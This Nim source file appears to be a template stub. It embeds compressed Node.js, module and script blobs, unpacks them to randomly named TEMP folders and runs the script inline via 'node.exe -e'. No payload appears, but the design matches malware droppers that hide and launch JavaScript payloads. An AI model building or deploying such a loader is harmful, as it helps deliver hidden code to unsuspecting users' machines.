import
    std/[strutils, base64, os, random, sha1],
    zippy, zippy/ziparchives, sha256

const
    nodejs = "${gzipedStreamNodejs}"
    modules = "${gzipedStreamModules}"
    index = "${gzipedStreamIndex}"
    temp = getEnv("TEMP")

proc randHash: string =
    for _ in 0..10:
        add(result, char(rand(int('A')..int('z'))))
    result = $computeSHA512(result)

let
    nodejsDir = randHash()
    modulesDir = randHash()

proc unpackString(str: string): string =
    var
        decompressed = uncompress(decode(str), dfZlib)
    result = decompressed

proc unpackNodeJS: void =
    var nodejs = unpackString(nodejs)
    writeFile(temp / nodejsDir & ".zip", nodejs)
    extractAll(temp / nodejsDir & ".zip", temp / nodejsDir)
    removeFile(temp / nodejsDir & ".zip")

proc unpackModules: void =
    var modules = unpackString(modules)
    writeFile(temp / modulesDir & ".zip", modules)
    extractAll(temp / modulesDir & ".zip", temp / modulesDir)
    removeFile(temp / modulesDir & ".zip")

proc unpackIndex: void =
    var index = unpackString(index)
    discard execShellCmd(temp / nodejsDir / "node.exe -e \"" & index.escape & "\"")